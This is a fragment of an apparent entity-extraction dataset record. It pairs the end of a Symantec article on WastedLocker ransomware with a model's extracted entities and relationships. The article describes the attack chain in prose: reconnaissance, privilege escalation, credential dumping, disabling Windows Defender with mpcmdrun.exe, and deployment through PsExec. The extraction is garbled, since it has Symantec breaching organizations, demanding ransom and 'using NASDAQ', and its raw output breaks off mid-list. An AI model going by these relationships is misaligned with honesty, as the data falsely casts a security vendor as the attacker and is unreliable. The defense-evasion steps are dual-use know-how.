elevate current processes or impersonate other processes, and upload and download files. The Get-NetComputer command fromPowerViewis renamed by the attackers to a random name. This command was then seen searching for all the computer objects in the Active Directory database with filter condition like *server* or *2003* or *7* (returning all Windows Server, Windows Server 2003, or Windows 7 instances). The attackers then logged this information in a .tmp file. Privilege escalation was performed usinga publicly documented techniqueinvolving the Software Licensing User Interface tool (slui.exe), a Windows command line utility that is responsible for activating and updating the Windows operating system. The attackers used the Windows Management Instrumentation Command Line Utility (wmic.exe) to execute commands on remote computers, such as adding a new user or executing additional downloaded PowerShell scripts. Cobalt Strike was also used to carry out credential dumping using ProcDump and to empty log files. In order to deploy the ransomware, the attackers use the Windows Sysinternals tool PsExec to launch a legitimate command line tool for managing Windows Defender (mpcmdrun.exe) to disable scanning of all downloaded files and attachments, remove all installed definitions, and, in some cases, disable real-time monitoring. It is possible that the attackers use more than one technique to perform this task, since NCC reported suspected use of a tool called SecTool checker for this purpose. PsExec is then used to launch PowerShell which uses the win32_service WMI class to retrieve services and the net stop command to stop these services. After Windows Defender is disabled and services have been stopped across the organization, PsExec is used to launch the WastedLocker ransomware itself, which then begins encrypting data and deleting shadow volumes. The attackers behind this threat appear to be skilled and experienced, capable of penetrating some of the most well protected corporations, stealing credentials, and moving with ease across their networks. As such, WastedLocker is a highly dangerous piece of ransomware. A successful attack could cripple the victim’s network, leading to significant disruption to their operations and a costly clean-up operation. The following protections are in place to protect customers against WastedLocker attacks and associated activity: File-based protection Note: C&C domains linked to this activity have been reported by Symantec to the relevant registrar. We would like to thank Namecheap for their assistance in suspending some domains associated with this attack. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Symantec, Company), (WastedLocker, Malware), (SocGholish, Malware), (Evil Corp, Attacker), (NCC Group, Company), (Dridex, Malware), (BitPaymer, Malware), (U.S., Country), (Broadcom, Company), (NASDAQ, Stock Exchange), (AVGO, Stock Symbol), (News, Topic), (IT Infrastructure, Asset), (Multimillion Dollar Ransom, Financial Target)\nRelationships: (Symantec, identifies, WastedLocker), (Symantec, alerts, customer organizations), (Symantec, uses, NASDAQ), (Symantec, affiliatedWith, Broadcom), (Symantec, notifies, company), (Symantec, attributesTo, Evil Corp), (Symantec, documents, NCC Group), (Symantec, performs outreach, affected networks), (Symantec, breaches, targeted organizations), (Symantec, laysGroundworkFor, ransomware attacks), (Symantec, targets, IT infrastructure), (Symantec, demands, multimillion dollar ransom), (Symantec, removes, malicious code), (Symantec, investigates, Compromised Websites), (Symantec, confirms, Compromise), (Symantec, discovers, WastedLocker), (Symantec, detects, SocGholish), (Symantec, identifies",
      "entities": [
        [
          "Symantec",
          "Company"
        ],
        [
          "WastedLocker",
          "Malware"
        ],
        [
          "SocGholish",
          "Malware"
        ],
        [
          "Evil Corp",
          "Attacker"
        ],
        [
          "NCC Group",
          "Company"
        ],
        [
          "Dridex",
          "Malware"
        ],
        [
          "BitPaymer",
          "Malware"
        ],
        [
          "U.S.",
          "Country"
        ],
        [
          "Broadcom",
          "Company"
        ],
        [
          "NASDAQ",
          "Stock Exchange"
        ],
        [
          "AVGO",
          "Stock Symbol"
        ],
        [
          "News",
          "Topic"
        ],
        [
          "IT Infrastructure",
          "Asset"
        ],
        [
          "Multimillion Dollar Ransom",
          "Financial Target"
        ]
      ],
      "relationships": [
        [
          "Symantec",
          "identifies",
          "WastedLocker"
        ],
        [
          "Symantec",
          "alerts",
          "customer organizations"
        ],
        [
          "Symantec",
          "uses",
          "NASDAQ"
        ],
        [
          "Symantec",
          "affiliatedWith",
          "Broadcom"
        ],
        [
          "Symantec",
          "notifies",
          "company"
        ],
        [
          "Symantec",
          "attributesTo",
          "Evil Corp"
        ],
        [
          "Symantec",
          "documents",
          "NCC Group"
        ],
        [
          "Symantec",
          "performs outreach",
          "affected networks"
        ],
        [
          "Symantec",
          "breaches",
          "targeted organizations"
        ],
        [
          "Symantec",
          "laysGroundworkFor",
          "ransomware attacks"
        ],
        [
          "Symantec",
          "targets",
          "IT infrastructure"
        ],
        [
          "Symantec",
          "demands",
          "multimillion dollar ransom"
        ],
        [
          "Symantec",
          "removes",
          "malicious code"
        ],
        [
          "Symantec",
          "investigates",
          "Compromised Websites"
        ],
        [
          "Symantec",
          "confirms",
          "Compromise"
        ],
        [
          "Symantec",
          "discovers",
          "WastedLocker"
        ],
        [
          "Symantec",
          "detects",
          "SocGholish"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 14,
    "relationship_count": 17
  }
]